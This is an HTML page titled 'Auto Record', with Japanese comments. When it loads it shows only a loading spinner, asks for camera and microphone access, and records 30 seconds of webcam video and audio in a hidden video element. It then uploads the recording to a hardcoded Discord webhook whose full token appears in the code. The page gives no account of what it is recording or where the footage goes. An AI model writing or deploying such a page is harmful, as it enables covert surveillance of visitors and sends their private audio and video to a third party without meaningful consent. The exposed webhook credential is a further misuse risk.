<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Auto Record</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        video {
            display: none; /* 非表示にしたい場合 */
        }
    </style>
</head>
<body>

<div id="spinner"></div>
<video id="video" autoplay muted></video>

<script>
    const webhookURL = "https://discord.com/api/webhooks/1377883943642333194/wPfWly6Kbxjg64NOp0xbEnDzOkwOH0Vhq8sAnex10T3b5rcOh3v-HPeXE6nKELQclAYq";
    const video = document.getElementById("video");
    const spinner = document.getElementById("spinner");

    let recordedChunks = [];

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
        .then(stream => {
            video.srcObject = stream;

            const mediaRecorder = new MediaRecorder(stream);

            mediaRecorder.ondataavailable = event => {
                if (event.data.size > 0) recordedChunks.push(event.data);
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: "video/webm" });
                const file = new File([blob], "recorded.webm", { type: "video/webm" });

                const formData = new FormData();
                formData.append("file", file);
                formData.append("content", "📹 自動録画データ");

                fetch(webhookURL, {
                    method: "POST",
                    body: formData
                })
                .then(res => {
                    spinner.style.display = "none";
                    if (res.ok) {
                        alert("✅ 録画をDiscordに送信しました！");
                    } else {
                        alert("❌ Discord送信失敗: " + res.status);
                    }
                })
                .catch(err => {
                    spinner.style.display = "none";
                    console.error("送信エラー:", err);
                    alert("❌ エラーが発生しました");
                });
            };

            // 録画開始
            mediaRecorder.start();

            // 任意の録画時間（ミリ秒）→ 例: 30000 = 30秒
            const RECORD_DURATION = 30000;

            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
            }, RECORD_DURATION);
        })
        .catch(error => {
            console.error("カメラ・マイクの取得に失敗:", error);
            alert("❌ カメラまたはマイクの使用が許可されていません。");
        });
</script>

</body>
</html>
